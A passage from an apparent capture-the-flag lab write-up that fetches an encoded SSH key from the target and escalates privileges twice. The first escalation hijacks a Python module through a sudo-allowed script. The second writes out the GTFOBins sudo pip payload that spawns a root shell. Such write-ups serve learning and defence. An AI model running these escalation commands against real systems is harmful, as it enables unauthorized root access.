## 4. SSH Key

`.mysecret.txt` is a massive single-line blob — base58 encoded.

<TerminalOutput
  cmd="curl http://10.0.0.195/~secret/.mysecret.txt >> secret.txt && base58 -d secret.txt"

<Note type="note">
  The `base58` CLI gave an "unsupported" error on the raw output. Decoded it via CyberChef instead, saved to `secret.key`, and set permissions: `chmod 400 secret.key`.
</Note>

## 6. Privilege Escalation — icex64 → arsene

`sudo -l` shows icex64 can run `heist.py` as `arsene` without a password:

```
(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

`heist.py` only imports `webbrowser` — if I can hijack that module, I control what runs as arsene. Checking what's writable in the Python path:

## 7. Privilege Escalation — arsene → root

<TerminalOutput
  cmd="sudo -l"
  output={`(root) NOPASSWD: /usr/bin/pip`}
/>

`pip` runs as root. GTFOBins pip trick — writes a `setup.py` that spawns a shell and installs it:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```
